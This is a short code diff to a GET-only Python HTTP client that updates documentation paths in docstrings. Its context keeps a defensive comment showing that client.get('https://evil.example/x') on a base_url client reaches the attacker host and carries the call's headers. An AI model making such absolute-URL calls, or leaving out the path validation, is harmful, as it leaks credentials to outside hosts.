@@ -4,7 +4,7 @@ This client exposes GET only. The write path lives in services/confirm and is
 reachable only from a signed approval, so a write method here would be the
 capability the whole design removes.
 
-`httpx2` is FastMCP 4's HTTP dependency; see docs/decisions/0001.
+`httpx2` is FastMCP 4's HTTP dependency; see dev-docs/decisions/0001.
 
 Must satisfy `postern_core.facade.protocol.BackendReader` structurally
 (Task 4); this module deliberately does not import that Protocol, so
@@ -121,7 +121,7 @@ def _validate_path(path: str) -> None:
 
     `httpx2.AsyncClient(base_url=...)` merges a *relative* path onto the base
     URL, but an absolute URL passed to `.get()` replaces the base entirely.
-    Empirically confirmed (docs/decisions/0001's sibling spike, same
+    Empirically confirmed (dev-docs/decisions/0001's sibling spike, same
     `httpx2.MockTransport` technique): `client.get("https://evil.example/x")`
     against a client built with `base_url="https://backend.test"` reaches
     `evil.example`, carrying whatever `headers=` the call set -- including
